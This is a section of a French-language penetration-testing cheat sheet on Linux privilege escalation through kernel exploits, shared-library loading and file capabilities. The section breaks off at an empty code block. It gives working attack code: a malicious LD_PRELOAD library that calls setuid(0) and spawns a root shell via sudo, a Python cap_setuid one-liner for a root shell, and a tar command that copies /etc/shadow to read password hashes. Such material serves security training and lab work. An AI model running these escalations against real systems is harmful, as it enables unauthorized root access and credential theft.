# 05-Escalade Basée sur les Mécanismes Internes de Linux

### Exploits Noyau (Kernel Exploits)
> Exploiter des vulnérabilités dans le noyau Linux lui-même. C'est souvent risqué et peut causer l'instabilité du système.

**1. Identification de la Version du Noyau et de la Distribution :**
```bash
uname -a
cat /etc/os-release
cat /etc/issue
lsb_release -a
```

**2. Recherche d'Exploits :**
*   Rechercher sur Exploit-DB, GitHub, Google avec la version du noyau et de la distribution.
*   Utiliser des outils comme `linux-exploit-suggester` ou `linux-exploit-suggester-2`.

**3. Compilation et Exécution (Exemple Générique) :**
```bash
# Transférer le code source de l'exploit (ex: kernel_exploit.c) sur la cible.
# Compiler l'exploit (nécessite gcc et les headers du noyau, parfois)
gcc kernel_exploit.c -o kernel_exploit -pthread # Les options de compilation varient
chmod +x kernel_exploit
./kernel_exploit
# Si réussi, un shell root ou un utilisateur privilégié est obtenu.
```
> **Attention :** Toujours tester les exploits noyau dans un environnement contrôlé. Ils peuvent planter le système.
> **Test et Validation des Exploits Potentiels (Méthodique) :**
> *   **Environnement de test :** Si possible, reproduire la configuration vulnérable dans un environnement de test avant d'exécuter des exploits sur le système cible.
> *   **Compréhension de l'exploit :** Bien comprendre comment l'exploit fonctionne avant de l'utiliser. Modifier l'exploit si nécessaire pour l'adapter à l'environnement cible.
> *   **Exécution prudente :** Exécuter les exploits avec prudence pour éviter de crasher le système.
> *   **Vérification de l'élévation :** Après l'exécution de l'exploit, vérifier si l'élévation de privilèges a réussi (`whoami`, `id`).

### Bibliothèques Partagées (LD_PRELOAD, LD_LIBRARY_PATH)
> Abuser du mécanisme de chargement des bibliothèques partagées.

**1. `LD_PRELOAD` avec Sudo :**
> Si `sudo -l` montre que la variable `LD_PRELOAD` est conservée (`env_keep+=LD_PRELOAD`) lors de l'exécution d'une commande avec `sudo`.
```bash
# Vérifier la configuration sudo
sudo -l

# Créer une bibliothèque malveillante (ex: /tmp/evil_lib.c)
cat << EOF > /tmp/evil_lib.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
  unsetenv("LD_PRELOAD"); // Éviter les boucles infinies
  setgid(0);
  setuid(0);
  system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -o /tmp/evil_lib.so /tmp/evil_lib.c -nostartfiles

# Exécuter la commande autorisée par sudo avec LD_PRELOAD pointant vers notre bibliothèque
sudo LD_PRELOAD=/tmp/evil_lib.so /chemin/vers/commande_autorisee_par_sudo
```

**2. `LD_LIBRARY_PATH` :**
> Si un binaire SUID root utilise `LD_LIBRARY_PATH` et que cette variable pointe vers un répertoire inscriptible, on peut y placer une bibliothèque malveillante portant le même nom qu'une bibliothèque légitime chargée par le binaire.
```bash
# Scénario : un binaire SUID /usr/local/bin/suid_app charge libexample.so
# Et nous pouvons contrôler LD_LIBRARY_PATH ou écrire dans un des chemins de LD_LIBRARY_PATH.
# Créer notre propre libexample.so malveillante.
# gcc -shared -fPIC -o /tmp/ourlibs/libexample.so evil_code.c
# export LD_LIBRARY_PATH=/tmp/ourlibs:$LD_LIBRARY_PATH
# /usr/local/bin/suid_app # Devrait charger notre libexample.so
```

### Capacités Linux (Capabilities)
> Les capacités Linux permettent de diviser les privilèges root en unités plus petites. Un binaire avec certaines capacités peut effectuer des actions privilégiées spécifiques.

**1. Lister les Capacités des Fichiers :**
```bash
getcap -r / 2>/dev/null
```
**2. Exploitation des Capacités :**
> Rechercher des binaires avec des capacités intéressantes (ex: `cap_sys_admin`, `cap_setuid`, `cap_setgid`, `cap_dac_override`, `cap_dac_read_search`, `cap_chown`, `cap_fowner`).
> Consulter GTFOBins pour les techniques d'exploitation basées sur les capacités.

*   **Scénario 4 (Capabilities dangereuses) :** Si des binaires ont des capabilities comme `cap_setuid`, `cap_setgid`, `cap_sys_admin`, `cap_dac_override`, explorer comment ces capabilities peuvent être utilisées pour élever les privilèges.
    *   Exemple (`cap_setuid` sur un interpréteur) :
        ```bash
        # getcap /usr/bin/python*
        # Si python a cap_setuid+ep:
        # /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
        ```
    *   Exemple (`cap_dac_read_search` sur `tar`) :
        ```bash
        # Si tar a cap_dac_read_search :
        /usr/bin/tar -cf /tmp/shadow.tar /etc/shadow
        # Extraire /tmp/shadow.tar pour lire le fichier shadow.
        ```
    *   Exemple (`cap_sys_admin`): Cette capacité est très puissante et permet de nombreuses actions, y compris le montage de systèmes de fichiers. Si un binaire comme `mount` a cette capacité (ou si un binaire général comme `python` l'a), cela peut être abusé.

Exemple avec `tar` ayant la capacité `cap_dac_read_search` (permet de lire n'importe quel fichier) ou `cap_dac_override` :
```